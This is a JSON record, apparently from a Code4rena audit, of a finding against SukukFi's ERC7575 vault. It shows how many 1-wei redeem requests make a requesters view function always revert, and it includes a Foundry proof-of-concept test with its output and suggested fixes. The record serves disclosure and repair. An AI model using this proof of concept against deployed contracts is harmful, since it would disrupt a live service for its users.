@@ -1,0 +1,122 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "K8iEhnzEysb",
+    "requested_finding_uid": "yZs283iFYxR",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "K8iEhnzEysb",
+    "source_finding_uid": "yZs283iFYxR",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\low_valid_K8iEhnzEysb.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "K8iEhnzEysb",
+  "finding_uid": "yZs283iFYxR",
+  "finding_number": "171",
+  "title": "The `getActiveRedeemRequesters()` & `getActiveDepositRequesters()` can be DOSed by creating many small requests",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0xhunter20",
+  "body": "## Finding description and impact\n\nIn `ERC7575VaultUpgradeable.sol`, there are two view functions that return active requesters but revert when more than 100 requesters exist:\n\n```solidity\nfunction getActiveDepositRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n    if ($.activeDepositRequesters.length() > 100) {\n        revert TooManyRequesters();\n    }\n    return $.activeDepositRequesters.values();\n}\n\nfunction getActiveRedeemRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n    if ($.activeRedeemRequesters.length() > 100) revert TooManyRequesters();\n    return $.activeRedeemRequesters.values();\n}\n```\n\nThe `requestRedeem()` function has no minimum amount check (only `shares > 0`):\n\n```solidity\nfunction requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {\n    if (shares == 0) revert ZeroShares();  // Only checks > 0, no minimum\n    // ... rest of function\n    $.activeRedeemRequesters.add(controller);  // Adds unique controller to set\n}\n```\n\nA malicious user with shares can create many 1-wei redeem requests using different controller addresses, causing `getActiveRedeemRequesters()` to always revert once > 100 unique controllers exist.\n\n**Impact:**\n`getActiveRedeemRequesters()` becomes unusable (always reverts)\n\n## Recommended mitigation steps\n\n1. Add a minimum redeem amount similar to deposits:\n\n```solidity\nfunction requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {\n    if (shares == 0) revert ZeroShares();\n+   if (shares < $.minimumRedeemAmount) revert InsufficientRedeemAmount();\n    // ... rest of function\n}\n```\n\n2. Alternatively, remove the revert in view functions and just return up to 100 entries:\n\n```solidity\nfunction getActiveRedeemRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n-   if ($.activeRedeemRequesters.length() > 100) revert TooManyRequesters();\n+   uint256 length = $.activeRedeemRequesters.length();\n+   if (length > 100) length = 100;\n+   address[] memory result = new address[](length);\n+   for (uint256 i = 0; i < length; i++) {\n+       result[i] = $.activeRedeemRequesters.at(i);\n+   }\n+   return result;\n}\n```",
+  "proof_of_concept": "## Proof of Concept\n\nAdd the following test function to `test/PaginationEfficiencyTest.t.sol`:\n\n```solidity\n/// @dev PoC: DOS getActiveRedeemRequesters() by creating >100 unique controller requests\nfunction test_DOS_getActiveRedeemRequesters() public {\n    // First, give attacker some shares by depositing and fulfilling\n    address attacker = address(0xBAD);\n    vm.warp(block.timestamp + 2 hours);\n    asset.faucetAmountFor(attacker, 10000e18);\n    \n    vm.startPrank(attacker);\n    asset.approve(address(vault), 10000e18);\n    vault.requestDeposit(10000e18, attacker, attacker);\n    vm.stopPrank();\n    \n    // Fulfill deposit to get shares\n    shareToken.setInvestmentManager(address(this));\n    vault.fulfillDeposit(attacker, 10000e18);\n    \n    vm.prank(attacker);\n    vault.deposit(10000e18, attacker);\n    \n    uint256 attackerShares = shareToken.balanceOf(attacker);\n    console.log(\"Attacker shares:\", attackerShares);\n    \n    // Create 101 redeem requests with different controller addresses (1 wei each)\n    vm.startPrank(attacker);\n    for (uint256 i = 0; i < 101; i++) {\n        address uniqueController = address(uint160(0xDEAD0000 + i));\n        vault.requestRedeem(1, uniqueController, attacker);\n    }\n    vm.stopPrank();\n    \n    // Now getActiveRedeemRequesters() will always revert\n    vm.expectRevert(abi.encodeWithSignature(\"TooManyRequesters()\"));\n    vault.getActiveRedeemRequesters();\n    \n    console.log(\"DOS successful: getActiveRedeemRequesters() always reverts\");\n    \n    // But paginated function still works\n    (ERC7575VaultUpgradeable.ControllerStatus[] memory statuses, uint256 total, bool hasMore) = \n        vault.getRedeemControllerStatusBatchPaginated(0, 50);\n    \n    console.log(\"Paginated function works - total requesters:\", total);\n    assertEq(total, 101);\n}\n```\n\n**Run command:**\n```bash\nforge test --match-test \"test_DOS_getActiveRedeemRequesters\" -vvv\n```\n\n**Output:**\n```\n[PASS] test_DOS_getActiveRedeemRequesters() (gas: 9044896)\nLogs:\n  Attacker shares: 10000000000000000000000\n  DOS successful: getActiveRedeemRequesters() always reverts\n  Paginated function works - total requesters: 101\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L715-L746",
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L1910-L1916",
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L1939-L1943"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "782",
+    "api_submission_id": "",
+    "uid": "K8iEhnzEysb",
+    "number": "782",
+    "title": "The `getActiveRedeemRequesters()` & `getActiveDepositRequesters()` can be DOSed by creating many small requests",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0xhunter20",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L715-L746",
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L1910-L1916",
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L1939-L1943"
+    ],
+    "body": "## Finding description and impact\n\nIn `ERC7575VaultUpgradeable.sol`, there are two view functions that return active requesters but revert when more than 100 requesters exist:\n\n```solidity\nfunction getActiveDepositRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n    if ($.activeDepositRequesters.length() > 100) {\n        revert TooManyRequesters();\n    }\n    return $.activeDepositRequesters.values();\n}\n\nfunction getActiveRedeemRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n    if ($.activeRedeemRequesters.length() > 100) revert TooManyRequesters();\n    return $.activeRedeemRequesters.values();\n}\n```\n\nThe `requestRedeem()` function has no minimum amount check (only `shares > 0`):\n\n```solidity\nfunction requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {\n    if (shares == 0) revert ZeroShares();  // Only checks > 0, no minimum\n    // ... rest of function\n    $.activeRedeemRequesters.add(controller);  // Adds unique controller to set\n}\n```\n\nA malicious user with shares can create many 1-wei redeem requests using different controller addresses, causing `getActiveRedeemRequesters()` to always revert once > 100 unique controllers exist.\n\n**Impact:**\n`getActiveRedeemRequesters()` becomes unusable (always reverts)\n\n## Recommended mitigation steps\n\n1. Add a minimum redeem amount similar to deposits:\n\n```solidity\nfunction requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {\n    if (shares == 0) revert ZeroShares();\n+   if (shares < $.minimumRedeemAmount) revert InsufficientRedeemAmount();\n    // ... rest of function\n}\n```\n\n2. Alternatively, remove the revert in view functions and just return up to 100 entries:\n\n```solidity\nfunction getActiveRedeemRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n-   if ($.activeRedeemRequesters.length() > 100) revert TooManyRequesters();\n+   uint256 length = $.activeRedeemRequesters.length();\n+   if (length > 100) length = 100;\n+   address[] memory result = new address[](length);\n+   for (uint256 i = 0; i < length; i++) {\n+       result[i] = $.activeRedeemRequesters.at(i);\n+   }\n+   return result;\n}\n```",
+    "proof_of_concept": "## Proof of Concept\n\nAdd the following test function to `test/PaginationEfficiencyTest.t.sol`:\n\n```solidity\n/// @dev PoC: DOS getActiveRedeemRequesters() by creating >100 unique controller requests\nfunction test_DOS_getActiveRedeemRequesters() public {\n    // First, give attacker some shares by depositing and fulfilling\n    address attacker = address(0xBAD);\n    vm.warp(block.timestamp + 2 hours);\n    asset.faucetAmountFor(attacker, 10000e18);\n    \n    vm.startPrank(attacker);\n    asset.approve(address(vault), 10000e18);\n    vault.requestDeposit(10000e18, attacker, attacker);\n    vm.stopPrank();\n    \n    // Fulfill deposit to get shares\n    shareToken.setInvestmentManager(address(this));\n    vault.fulfillDeposit(attacker, 10000e18);\n    \n    vm.prank(attacker);\n    vault.deposit(10000e18, attacker);\n    \n    uint256 attackerShares = shareToken.balanceOf(attacker);\n    console.log(\"Attacker shares:\", attackerShares);\n    \n    // Create 101 redeem requests with different controller addresses (1 wei each)\n    vm.startPrank(attacker);\n    for (uint256 i = 0; i < 101; i++) {\n        address uniqueController = address(uint160(0xDEAD0000 + i));\n        vault.requestRedeem(1, uniqueController, attacker);\n    }\n    vm.stopPrank();\n    \n    // Now getActiveRedeemRequesters() will always revert\n    vm.expectRevert(abi.encodeWithSignature(\"TooManyRequesters()\"));\n    vault.getActiveRedeemRequesters();\n    \n    console.log(\"DOS successful: getActiveRedeemRequesters() always reverts\");\n    \n    // But paginated function still works\n    (ERC7575VaultUpgradeable.ControllerStatus[] memory statuses, uint256 total, bool hasMore) = \n        vault.getRedeemControllerStatusBatchPaginated(0, 50);\n    \n    console.log(\"Paginated function works - total requesters:\", total);\n    assertEq(total, 101);\n}\n```\n\n**Run command:**\n```bash\nforge test --match-test \"test_DOS_getActiveRedeemRequesters\" -vvv\n```\n\n**Output:**\n```\n[PASS] test_DOS_getActiveRedeemRequesters() (gas: 9044896)\nLogs:\n  Attacker shares: 10000000000000000000000\n  DOS successful: getActiveRedeemRequesters() always reverts\n  Paginated function works - total requesters: 101\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/782",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-05T07:06:14.564Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "vzzWSRMjLcr",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-16T02:14:37.632Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "yZs283iFYxR"
+        },
+        {
+          "uid": "YP9DAJBBTKf",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-16T02:14:39.507Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "yZs283iFYxR"
+        },
+        {
+          "uid": "TFf3hQ7DDja",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-16T02:14:46.217Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "K8iEhnzEysb",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "yZs283iFYxR",
+        "number": 171,
+        "duplicates": 3
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-12-18T05:24:22.586Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "The `getActiveRedeemRequesters()` & `getActiveDepositRequesters()` can be DOSed by creating many small requests",
+      "uid": "K8iEhnzEysb",
+      "updatedAt": "2025-12-05T07:06:14.564Z",
+      "user": {
+        "uid": "fSRvA37Eee2",
+        "handle": "0xhunter20"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nIn `ERC7575VaultUpgradeable.sol`, there are two view functions that return active requesters but revert when more than 100 requesters exist:\n\n```solidity\nfunction getActiveDepositRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n    if ($.activeDepositRequesters.length() > 100) {\n        revert TooManyRequesters();\n    }\n    return $.activeDepositRequesters.values();\n}\n\nfunction getActiveRedeemRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n    if ($.activeRedeemRequesters.length() > 100) revert TooManyRequesters();\n    return $.activeRedeemRequesters.values();\n}\n```\n\nThe `requestRedeem()` function has no minimum amount check (only `shares > 0`):\n\n```solidity\nfunction requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {\n    if (shares == 0) revert ZeroShares();  // Only checks > 0, no minimum\n    // ... rest of function\n    $.activeRedeemRequesters.add(controller);  // Adds unique controller to set\n}\n```\n\nA malicious user with shares can create many 1-wei redeem requests using different controller addresses, causing `getActiveRedeemRequesters()` to always revert once > 100 unique controllers exist.\n\n**Impact:**\n`getActiveRedeemRequesters()` becomes unusable (always reverts)\n\n## Recommended mitigation steps\n\n1. Add a minimum redeem amount similar to deposits:\n\n```solidity\nfunction requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {\n    if (shares == 0) revert ZeroShares();\n+   if (shares < $.minimumRedeemAmount) revert InsufficientRedeemAmount();\n    // ... rest of function\n}\n```\n\n2. Alternatively, remove the revert in view functions and just return up to 100 entries:\n\n```solidity\nfunction getActiveRedeemRequesters() external view returns (address[] memory) {\n    VaultStorage storage $ = _getVaultStorage();\n-   if ($.activeRedeemRequesters.length() > 100) revert TooManyRequesters();\n+   uint256 length = $.activeRedeemRequesters.length();\n+   if (length > 100) length = 100;\n+   address[] memory result = new address[](length);\n+   for (uint256 i = 0; i < length; i++) {\n+       result[i] = $.activeRedeemRequesters.at(i);\n+   }\n+   return result;\n}\n```",
+      "proofOfConcept": "## Proof of Concept\n\nAdd the following test function to `test/PaginationEfficiencyTest.t.sol`:\n\n```solidity\n/// @dev PoC: DOS getActiveRedeemRequesters() by creating >100 unique controller requests\nfunction test_DOS_getActiveRedeemRequesters() public {\n    // First, give attacker some shares by depositing and fulfilling\n    address attacker = address(0xBAD);\n    vm.warp(block.timestamp + 2 hours);\n    asset.faucetAmountFor(attacker, 10000e18);\n    \n    vm.startPrank(attacker);\n    asset.approve(address(vault), 10000e18);\n    vault.requestDeposit(10000e18, attacker, attacker);\n    vm.stopPrank();\n    \n    // Fulfill deposit to get shares\n    shareToken.setInvestmentManager(address(this));\n    vault.fulfillDeposit(attacker, 10000e18);\n    \n    vm.prank(attacker);\n    vault.deposit(10000e18, attacker);\n    \n    uint256 attackerShares = shareToken.balanceOf(attacker);\n    console.log(\"Attacker shares:\", attackerShares);\n    \n    // Create 101 redeem requests with different controller addresses (1 wei each)\n    vm.startPrank(attacker);\n    for (uint256 i = 0; i < 101; i++) {\n        address uniqueController = address(uint160(0xDEAD0000 + i));\n        vault.requestRedeem(1, uniqueController, attacker);\n    }\n    vm.stopPrank();\n    \n    // Now getActiveRedeemRequesters() will always revert\n    vm.expectRevert(abi.encodeWithSignature(\"TooManyRequesters()\"));\n    vault.getActiveRedeemRequesters();\n    \n    console.log(\"DOS successful: getActiveRedeemRequesters() always reverts\");\n    \n    // But paginated function still works\n    (ERC7575VaultUpgradeable.ControllerStatus[] memory statuses, uint256 total, bool hasMore) = \n        vault.getRedeemControllerStatusBatchPaginated(0, 50);\n    \n    console.log(\"Paginated function works - total requesters:\", total);\n    assertEq(total, 101);\n}\n```\n\n**Run command:**\n```bash\nforge test --match-test \"test_DOS_getActiveRedeemRequesters\" -vvv\n```\n\n**Output:**\n```\n[PASS] test_DOS_getActiveRedeemRequesters() (gas: 9044896)\nLogs:\n  Attacker shares: 10000000000000000000000\n  DOS successful: getActiveRedeemRequesters() always reverts\n  Paginated function works - total requesters: 101\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L715-L746,https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L1910-L1916,https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/ERC7575VaultUpgradeable.sol#L1939-L1943",
+      "number": 782,
+      "aiExplanation": null,
+      "_index": 782
+    }
+  }
+}
